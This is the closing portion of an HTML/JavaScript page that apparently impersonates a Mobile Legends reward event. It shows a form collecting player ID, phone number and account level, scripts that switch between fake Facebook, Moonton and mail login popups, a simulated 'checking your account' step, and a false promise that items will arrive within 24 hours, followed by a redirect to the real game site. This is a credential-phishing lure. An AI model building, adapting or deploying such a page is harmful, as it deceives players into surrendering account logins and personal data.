<input type="number" name="playid" id="playid" placeholder="Player ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Player ID')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Phone number" autocomplete="off" required oninvalid="this.setCustomValidity('Input Your Phone Number')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('Pilih Tingkat Akun Anda')" oninput="setCustomValidity('')">
		<option selected="selected" disabled="disabled" value="">Account Level</option>
		<script>
			for(var i = 1; i <= 100; i++){
				document.write("<option>" + i + "</option>");
			};
		</script>
	</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br>
<br>
<div class="popup-box-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()"><font style="color:#d3d3d3;margin-left:0px">Verification</font></button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-alert4 --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account animated fadeIn" style="display: none;">
	<div class="popup-box-wrapper">
		<div class="popup-box-navbar">
			<div class="popup-box-navbar-title">Processing Accounts</div>
		</div>
		<div class="popup-box-bgz">
			<div class="popup-box-alert3"><br>
				Hello!<br>
<p>We are glad you are still loyal to Mobile Legend.
<br>Your item is being processed to be sent to your account.
<br>The item is sent to your in-game email inbox.</p>
<p>We will also notify you in your mailbox when we have successfully sent your item.
<br>Please allow up to 24 hours.</p>
					<br></p>
			<div class="popup-box-footer">
				<button type="button" style="margin-top: 3px;" onmousedown="tutup.play();" onclick="location.href='https://m.mobilelegends.com/';">logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/ionicons-json@5.0.2/ionicons.map.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<audio id="audioFile" src="media/putaran.mp3"></audio>
<script src="js/lazcode.js"></script>
<script src="js/showHide.js"></script>
<script src="js/slidernotif.js"></script>
<script src="js/showHide.js"></script>
<script src="js/sliders.js"></script>
<script src="js/timer.js"></script>

<script>
// code for activate clicked sound
var buka = new Audio();
buka.src = "media/open.mp3";

var tutup = new Audio();
tutup.src = "media/close.mp3";

function audioFile() {
    var audio = document.getElementById('audioFile');
    audio.play();}
$(document).ready(function(){
        $("o").attr("onclick", "audioFile()");
	});

// code for showing hiding items

setTimeout(function () {
  $('.loadkin').fadeOut(750);
}, 2000);
</script>
<script>
// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

function audioFile() {
    var audio = document.getElementById('audioFile');
    audio.play();}
$(document).ready(function(){
        $("o").attr("onclick", "audioFile()");
	});

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
function open_newhome(){
	$('.account_login').show();
	$('.newhome').hide();
}
function open_mail_login(){
	$('.login-mail').show()
	$('.account_login').hide();
}
function close_mail_login(){
	$('.login-mail').hide()
	$('.account_login').show();    
}
function open_about_event() {
     $('.about_event').show();
}
function open_event_rules() {
     $('.event_rules').show();
}
function open_verification(){
	$('.account_verification').show();
	$(".open_rewards").hide()
	$(".otherReward_confirmation").hide()
	$(".otherReward_confirmation3").hide()
	$(".itemReward_confirmation").hide()
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_itemReward_confirmation2(ag) {
    var itemReward_confirmationImg2 = $(ag).attr("src");
    $('.itemReward_confirmation2').fadeIn('slow'); 
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg2);
}
function open_itemReward_confirmation2(ag) {
  var itemReward_confirmationImg2 = $(ag).attr("src");
  var ItemName = $(ag).attr("item-name");
  var amount = $(ag).attr("item-total");
  var price = $(ag).attr("item-price");
  $('.itemReward_confirmation2').show();   
  $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg2);
  $('#ItemName').html(ItemName);
  $('#amount').html(amount);
  $('#price').html(price);
}
function open_itemReward_confirmation4(ag) {
    var itemReward_confirmationImg4 = $(ag).attr("src");
    $('.itemReward_confirmation4').show();
    $('#myItemReward_confirmationImg4').attr('src',itemReward_confirmationImg4);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_otherReward_confirmation3(ag) {
    var otherReward_confirmation3Img = $(ag).attr("src");
	var otherReward_confirmation3Value = $(ag).attr("value");
    $('.otherReward_confirmation3').show();
    $('#myOtherReward_confirmation3Img').attr('src',otherReward_confirmation3Img);
	$('#otherReward_confirmation3Value').html(otherReward_confirmationValue);
}
function close_reward_confirmation(){
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
	$(".itemReward_confirmation2").hide()
	$(".itemReward_confirmation3").hide()
	$(".itemReward_confirmation4").hide()
	$('.newhome').hide();
}
function close_reward_confirmations(){
    $('.event_rules').hide();	
    $('.about_event').hide();
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_moonton(){
	$('.login-moonton').show();
	$('.account_login').hide();
}
function close_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function close_moonton(){
	$('.login-moonton').hide()
	$('.account_login').show();
}
function open_newhome(){
    $('.account_login').show();
	$('.newhome').hide();
}
function open_account_verification(){
	$('.loadinglogin').show();
	$('#text-login1').show()
    setTimeout(function () {
      $('#text-login1').hide()
      $('#text-login2').fadeIn()
    }, 2000)
	$('.open_rewards').hide(); 
	$('.itemReward_confirmation2').hide();
	setTimeout(function () {
    $('.account_login').show();  
    $('.loadinglogin').hide();
      }, 5000);	
}
</script>
<script>
var counter = 1;

    setInterval(function()  {
      document.getElementById('radio'+ counter).checked = true;
      counter++; 

      if(counter>4){
        counter=1
      }

    }, 1800);
 </script>   
 <script>
var counter = 1;

    setInterval(function()  {
      document.getElementById('radionam'+ counter).checked = true;
      counter++; 

      if(counter>4){
        counter=1
      }

    }, 1600);
    </script>   
</script>
</body>
</html>